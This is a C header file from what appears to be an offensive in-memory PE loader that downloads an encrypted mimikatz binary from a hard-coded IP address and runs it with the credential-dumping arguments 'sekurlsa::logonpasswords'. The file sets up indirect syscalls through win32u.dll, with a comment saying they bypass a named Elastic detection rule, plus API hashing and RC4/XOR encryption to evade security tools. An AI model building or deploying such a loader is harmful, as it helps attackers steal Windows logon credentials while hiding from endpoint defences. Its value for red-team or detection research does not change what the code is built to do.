#pragma once
#include <windows.h>
#include "structs.h"


/*--------------------------------
 Search for syscall in win32u.dll
 if not defined a indirect syscall
 jmp address will be in ntdll.dll
 Implemented in order to bypass 
 https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_virtualprotect_via_indirect_random_syscall.toml
--------------------------------*/
#define WIN32_JMP


/*---------------------------
 Read from web or local file
---------------------------*/
#define WEB 80
//#define SECURE 443

#define HOST L"192.168.100.161"
#define REMOTE_FILE L"mimikatz-enc.bin"
#define LOCAL_FILE "C:\\Users\\lgreenleaf\\Desktop\\mimikatz-enc.bin"

#define PE_ARGS "privilege::debug sekurlsa::logonpasswords exit"
//#define DLL_EXPORTED_FUNC "someExportedFunc"    //in case of DLLs

/*------------------
  Debug output
------------------*/
#define DEBUG


/*-----------------------------------------
  Some default values
-----------------------------------------*/
#define HASH_SEED 8           //Hash function seed
#define RANGE 255             //Max range for syscall check
#define UP 32                 //Up check range
#define DOWN -32              //Down check range


/*------------------------
 Function hashes
------------------------*/
#define NtAllocateVirtualMemory_H 0x6E8AC28E
#define NtProtectVirtualMemory_H 0x1DA5BB2B
#define NtCreateThreadEx_H 0x08EC0B84A
#define NtWaitForSingleObject_H 0x6299AD3D
#define NtClose_H 0x369BD981



/*---------------------
  Global variables
---------------------*/
extern NTCONF g_NtConfig;
extern NTCONF g_Win32u;     // Struct to hold extracted PE headers from win32u.dll
extern SC_FUNC g_Fun;
extern CONTENT temp;    //To hold the Base addres of the copied PE and its size, used to encrypt/decrypt its content


/*-------------------------
  Prototype definitions
-------------------------*/

//Generics
SIZE_T CharStringToWCharString(IN PWCHAR Destination, IN PCHAR Source, IN SIZE_T MaximumAllowed);
BOOL ReadF(IN const char* file_path, IN PDWORD file_size, IN PVOID* read_buffer);
PVOID FetchExportAddress(IN PIMAGE_DATA_DIRECTORY pEntryExpDir, IN ULONG_PTR pPeBaseAddr, IN LPCSTR funcName);
BOOL Download(IN LPCWSTR url, IN LPCWSTR file, IN PCONTENT cnt);
BOOL GetPE(IN PCONTENT cnt);


//PE parsing and preparation
BOOL InitPE(IN PPEHDRS pPeHdrs, IN CONTENT cnt);
PBYTE PreparePE(IN PPEHDRS pPeHdrs);
BOOL ApplyRelocations(IN PIMAGE_DATA_DIRECTORY pBaseRelocDir, IN ULONG_PTR pBaseAddr, IN ULONG_PTR pPrefAddr);
BOOL FixImports(IN PIMAGE_DATA_DIRECTORY pImportTable, IN PBYTE pPeBaseAddr);
BOOL FixMem(IN ULONG_PTR pPeBaseAddr, IN PIMAGE_NT_HEADERS pNtHdrs, IN PIMAGE_SECTION_HEADER pSectHdrs);
VOID PrepareArgs(IN LPCSTR argsToPass);


//Execute the PE
BOOL Execute(IN ULONG_PTR pPeBaseAddr, IN PPEHDRS pPeHdrs, IN OPTIONAL LPCSTR exportedFunc);


//Encryption related
UINT32 HashA(IN PCHAR String);
BOOL rc4enc(IN PBYTE pKey, IN PBYTE pData, IN DWORD dwKey, IN DWORD sData);
VOID XoR(IN PBYTE pMessage, IN size_t sMsg_size, IN PBYTE key, IN size_t key_size);
char* GenKeyIP(IN char ips[][15], IN size_t count);
BOOL Crypt(IN PCONTENT cnt);


//Syscall related
BOOL NtInitConfig();
BOOL GetSyscl(IN DWORD dwSysHash, OUT PSYSCALL pSyscl);
BOOL InitSyscls();
//Win32u.dll indirect syscalls
#ifdef WIN32_JMP
VOID AddWin32();
BOOL ParseWin32(IN ULONG_PTR moduleBase);
BOOL FetchWin32Syscall(OUT PVOID* pSyscallJmpAddr);
#endif


//Dynamic syscall invoke
extern VOID GetSSN(DWORD SSN, PVOID jmpAddr);
extern Invoke();


//TLS callback
typedef VOID(NTAPI* PIMAGE_TLS_CALLBACK) (
	PVOID hModule,
	DWORD dwReason,
	PVOID pContext
	);

//Execute the entrypoint for EXE or DLL
typedef BOOL(WINAPI* DLLMAIN)(HINSTANCE, DWORD, LPVOID);
typedef BOOL(WINAPI* MAIN)();


//SystemFunction032
typedef NTSTATUS(NTAPI* fnSF032)(
	struct USTRING* Data,
	struct USTRING* Key
	);



/*--------------------------
  Simple macros
--------------------------*/
#ifdef DEBUG
#define DEBUG_PRINT(...) printf(__VA_ARGS__)
#define WDEBUG_PRINT(...) wprintf(__VA_ARGS__)
#else
#define DEBUG_PRINT(...) do {} while (0)
#define WDEBUG_PRINT(...) do {} while (0)
#endif


/*--------------------------
  Custom memcpy function
--------------------------*/
static inline void mymemcpy(char* dst, const char* src, int size) {
	int x;
	if (src == NULL) {
		for (x = 0; x < size; x++) {
			*dst = 0x00;
			dst++;
		}
	}
	else {
		for (x = 0; x < size; x++) {
			*dst = *src;
			dst++;
			src++;
		}
	}
}


/*----------------------------
 GetProcessHeap replacement
----------------------------*/
static inline HANDLE GetHeap() {
	PPEB pPeb = (PPEB)(__readgsqword(0x60));
	return (HANDLE)pPeb->ProcessHeap;
}